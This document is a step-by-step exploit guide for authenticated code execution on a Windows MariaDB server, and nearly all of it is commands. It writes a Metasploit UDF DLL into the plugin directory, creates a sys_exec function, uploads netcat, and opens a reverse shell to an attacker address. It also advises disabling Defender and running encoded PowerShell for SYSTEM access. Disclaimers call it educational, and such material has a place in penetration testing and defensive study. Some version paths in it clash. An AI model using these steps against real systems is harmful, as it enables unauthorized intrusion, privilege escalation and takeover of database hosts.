
---

# MariaDB  10.5 Authenticated Code execution

This guide provides detailed instructions to exploit a User-Defined Function (UDF) vulnerability in MariaDB on a remote server. These steps include downloading and executing malicious code on a vulnerable database system.

> **Warning:** This document is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.

## Steps to Reproduce the Attack

### 1. Connect to MariaDB Remote Host

Use the following command to connect to the MySQL server:

```bash
mysql -h 192.168.214.129 -u root -pPassw0rd!
```

### 2. Check MariaDB Version

To determine the version of MySQL running, execute:

```sql
select @@version;
```

### 3. List All Users

To see the current user logged in:

```sql
select user();
```

### 4. Dump All Information About the Root User

Retrieve all details related to the root user:

```sql
select * from mysql.user where user='root';
```

### 5. Check User Privileges

Determine what privileges the current user has:

```sql
show grants;
```

### 6. Check the Architecture of the System

Determine if the system architecture is vulnerable to UDF:

```sql
select @@version_compile_os, @@version_compile_machine;
```

### 7. Check the Plugin Directory

Identify the plugin directory where UDF files can be uploaded:

```sql
select @@plugin_dir;
```

### 8. Copy the 32-bit DLL

Copy the 32-bit DLL from Metasploit’s exploit directory:

```bash
ls /usr/share/metasploit-framework/data/exploits/mysql/
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll udf.dll
```

### 9. Convert the DLL to Base64 Format

Encode the `udf.dll` file in base64 format:

```bash
cat udf.dll | base64 | tr -d '\n' > udf.base64
```

### 10. Transfer the DLL to the MySQL Server

Copy the base64 value from `udf.base64` and transfer it into the MySQL server:

Open `udf.base64` in a text editor:

```bash
leafpad udf.base64
```

In MariaDB, run:

```sql
select from_base64("base64 value") into dumpfile 'C:\\Program Files\\MariaDB 10.4\\lib\\plugin\\udf.dll';
```

Alternatively, use the following path if necessary:

```plaintext
C:\Program Files\MariaDB 11.1\lib\plugin\
```

### 11. Load the UDF Function into MariaDB

Execute the following command in MariaDB to create a new function:

```sql
create function sys_exec returns int soname 'udf.dll';
```

> **Note:** You can also use `sys_eval`, `sys_get`, `do_system`, or `sys_bineval`. Ensure you use `int` and not `into`.

### 12. Verify the UDF Installation

Check if the UDF function was successfully installed:

```sql
select * from mysql.func;
```

### 13. Prepare the Netcat Binary

Copy the Netcat executable to your local directory and encode it in base64:

```bash
cp /usr/share/windows-binaries/nc.exe .
cat nc.exe | base64 | tr -d '\n' > nc.base64
```

### 14. Transfer Netcat to the MariaDB Server

Open `nc.base64` in a text editor:

```bash
leafpad nc.base64
```

Then, in MySQL:

```sql
select from_base64("base64valueofNc.exe") into dumpfile 'C:\\Program Files\\MariaDB 10.5\\lib\\plugin\\nc.exe';
```

Alternatively, you can directly upload it using:

```bash
mysql -u root -p -h 192.168.214.129 < nc.base64
```

### 15. Execute Netcat for a Reverse Shell

Turn on Netcat listener on port 443:

```bash
sudo nc -nlvp 443
```

Execute Netcat on the remote server for a reverse shell:

```sql
select sys_exec('C:\\Program Files\\MariaDB 10.4\\lib\\plugin\\nc.exe 192.168.214.128 443 -e cmd.exe');
```

> **Note:** This step may be blocked by Windows Defender or other antivirus software. Consider using PowerShell encoded commands (`powershellbase64`) and ensure Defender is turned off.

### 16. Execute PowerShell Commands

Execute a PowerShell command using base64 encoding:

```sql
select sys_exec('powershellbase64');
```

> **NOTE:** You may gain NT AUTHORITY SYSTEM privileges in many cases.

### Additional Information

- **Drop Function:** To remove any created UDF functions:

  ```sql
  drop function sys_get;
  ```

- **Check Local Infile:** Verify if local write is enabled:

  ```sql
  show variables like 'local_infile';
  ```

- **Find Users with Insert Privilege:** Identify which users have the insert privilege:

  ```sql
  use mysql;
  select user from user where insert_priv='Y' and Host='%';
  ```

---

**Disclaimer:** This document is intended for educational purposes and security research only. Misuse of this information can result in criminal charges and severe legal penalties. Always obtain permission from the relevant authorities before testing any vulnerabilities on a network or system.
